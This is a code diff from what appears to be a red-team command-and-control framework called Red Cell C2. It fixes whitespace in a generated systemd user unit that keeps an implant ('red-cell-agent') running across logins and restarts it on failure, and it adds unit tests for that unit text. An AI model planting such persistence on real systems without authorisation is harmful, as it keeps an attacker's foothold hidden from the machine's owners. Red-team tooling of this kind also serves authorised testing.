@@ -143,7 +143,7 @@ async fn persist_systemd_user(op: PhantomPersistOp, command: &str) -> Result<Str
                 .map_err(|e| format!("create {}: {e}", unit_dir.display()))?;
 
             let unit_content = format!(
-                "[Unit]\n                 Description=Red Cell C2 persistence ({PERSIST_MARKER})\n                 After=default.target\n                 \n                 [Service]\n                 Type=simple\n                 ExecStart={command}\n                 Restart=on-failure\n                 \n                 [Install]\n                 WantedBy=default.target\n"
+                "[Unit]\nDescription=Red Cell C2 persistence ({PERSIST_MARKER})\nAfter=default.target\n\n[Service]\nType=simple\nExecStart={command}\nRestart=on-failure\n\n[Install]\nWantedBy=default.target\n"
             );
 
             fs::write(&unit_path, unit_content)
@@ -285,4 +285,36 @@ pub(super) fn remove_shell_rc_block(text: &str, begin: &str, end: &str) -> Strin
     }
 
     result
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    #[test]
+    fn systemd_unit_no_leading_whitespace() {
+        let command = "/usr/bin/red-cell-agent";
+        let unit_content = format!(
+            "[Unit]\nDescription=Red Cell C2 persistence ({PERSIST_MARKER})\nAfter=default.target\n\n[Service]\nType=simple\nExecStart={command}\nRestart=on-failure\n\n[Install]\nWantedBy=default.target\n"
+        );
+        for line in unit_content.lines() {
+            assert!(
+                !line.starts_with(' ') && !line.starts_with('\t'),
+                "line starts with whitespace: {line:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn systemd_unit_contains_expected_sections() {
+        let command = "/usr/bin/red-cell-agent --some-flag";
+        let unit_content = format!(
+            "[Unit]\nDescription=Red Cell C2 persistence ({PERSIST_MARKER})\nAfter=default.target\n\n[Service]\nType=simple\nExecStart={command}\nRestart=on-failure\n\n[Install]\nWantedBy=default.target\n"
+        );
+        assert!(unit_content.contains("[Unit]\n"));
+        assert!(unit_content.contains("[Service]\n"));
+        assert!(unit_content.contains("[Install]\n"));
+        assert!(unit_content.contains(&format!("ExecStart={command}")));
+        assert!(unit_content.contains(PERSIST_MARKER));
+    }
 }
